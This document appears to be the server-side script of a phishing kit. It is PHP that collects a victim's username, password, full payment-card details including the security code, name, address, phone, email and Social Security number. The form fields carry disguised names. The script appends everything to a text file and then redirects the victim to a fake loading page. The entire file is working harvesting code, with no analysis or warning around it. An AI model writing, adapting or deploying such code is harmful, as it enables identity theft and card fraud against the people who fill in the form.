<?php

$uname = $_POST['uname'];
$passah = $_POST['passah'];
$chardname = $_POST['chardname'];
$chardnumb = $_POST['chardnumb'];
$czcpwd = $_POST['czcpwd'];
$expmun = $_POST['expmun'];
$expyeer = $_POST['expyeer'];
$firstna = $_POST['firstna'];
$lastna = $_POST['lastna'];
$addyone = $_POST['addyone'];
$magicfive = $_POST['magicfive'];
$fohne = $_POST['fohne'];
$emah = $_POST['emah'];
$sosh = $_POST['sosh'];

$file = "text.txt";
$Saved_File = fopen($file, 'a');

fwrite($Saved_File, '|<START>|');
fwrite($Saved_File, $uname);
fwrite($Saved_File, '||');
fwrite($Saved_File, $passah);
fwrite($Saved_File, '||');
fwrite($Saved_File, $chardname);
fwrite($Saved_File, '||');
fwrite($Saved_File, $chardnumb);
fwrite($Saved_File, '||');
fwrite($Saved_File, $czcpwd);
fwrite($Saved_File, '||');
fwrite($Saved_File, $expmun);
fwrite($Saved_File, '||');
fwrite($Saved_File, $expyeer);
fwrite($Saved_File, '||');
fwrite($Saved_File, $firstna);
fwrite($Saved_File, '||');
fwrite($Saved_File, $lastna);
fwrite($Saved_File, '||');
fwrite($Saved_File, $addyone);
fwrite($Saved_File, '||');
fwrite($Saved_File, $magicfive);
fwrite($Saved_File, '||');
fwrite($Saved_File, $fohne);
fwrite($Saved_File, '||');
fwrite($Saved_File, $emah);
fwrite($Saved_File, '||');
fwrite($Saved_File, $sosh);
fwrite($Saved_File, '|<END>|' . "\n");

fclose($Saved_File);

?>


<script>
//Using setTimeout to execute a function after 5 seconds.
setTimeout(function () {
   //Redirect with JavaScript
   window.location.href= "loading.html";
}, 1000);
</script>
